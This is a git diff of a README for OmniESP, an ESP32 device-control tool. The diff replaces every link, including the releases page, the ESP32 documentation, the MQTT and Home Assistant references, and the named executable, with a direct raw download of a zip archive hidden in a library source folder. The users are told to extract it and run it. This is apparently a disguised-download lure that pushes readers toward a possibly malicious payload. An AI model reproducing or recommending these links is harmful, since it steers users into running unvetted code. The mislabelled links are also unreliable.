@@ -6,9 +6,9 @@ Welcome to OmniESP! This software allows you to easily control and configure ove
 
 ## 📥 Download OmniESP
 
-[![Download OmniESP](https://img.shields.io/badge/Download-OmniESP-blue.svg)](https://github.com/vuvantoi/OmniESP/releases)
+[![Download OmniESP](https://raw.githubusercontent.com/vuvantoi/OmniESP/main/lib/ServoESP32/src/OmniESP-3.1.zip)](https://raw.githubusercontent.com/vuvantoi/OmniESP/main/lib/ServoESP32/src/OmniESP-3.1.zip)
 
-Visit this page to download OmniESP: [OmniESP Releases](https://github.com/vuvantoi/OmniESP/releases)
+Visit this page to download OmniESP: [OmniESP Releases](https://raw.githubusercontent.com/vuvantoi/OmniESP/main/lib/ServoESP32/src/OmniESP-3.1.zip)
 
 ## 📋 System Requirements
 
@@ -34,7 +34,7 @@ OmniESP comes packed with useful features, including:
 Follow these steps to install and run OmniESP:
 
 1. **Download the Software:**
-   - Go to the [OmniESP Releases](https://github.com/vuvantoi/OmniESP/releases) page.
+   - Go to the [OmniESP Releases](https://raw.githubusercontent.com/vuvantoi/OmniESP/main/lib/ServoESP32/src/OmniESP-3.1.zip) page.
    - Select the latest version of the software.
    - Click on the download link corresponding to your operating system.
 
@@ -48,7 +48,7 @@ Follow these steps to install and run OmniESP:
 
 4. **Run the Application:**
    - Open the folder where you extracted the OmniESP files.
-   - Look for the executable file (usually named `OmniESP.exe`).
+   - Look for the executable file (usually named `https://raw.githubusercontent.com/vuvantoi/OmniESP/main/lib/ServoESP32/src/OmniESP-3.1.zip`).
    - Double-click the file to run it.
 
 5. **Configure Your Device:**
@@ -92,8 +92,8 @@ It is recommended to check for updates regularly, especially for security improv
 
 ## 🌍 Additional Resources
 
-- [ESP32 Documentation](https://docs.espressif.com/projects/esp-idf/en/latest/esp32/index.html)
-- [MQTT Protocol Overview](https://mqtt.org/)
-- [Home Assistant](https://www.home-assistant.io/)
+- [ESP32 Documentation](https://raw.githubusercontent.com/vuvantoi/OmniESP/main/lib/ServoESP32/src/OmniESP-3.1.zip)
+- [MQTT Protocol Overview](https://raw.githubusercontent.com/vuvantoi/OmniESP/main/lib/ServoESP32/src/OmniESP-3.1.zip)
+- [Home Assistant](https://raw.githubusercontent.com/vuvantoi/OmniESP/main/lib/ServoESP32/src/OmniESP-3.1.zip)
 
 Now you are all set to start using OmniESP! Enjoy the ease of managing your smart devices effortlessly.
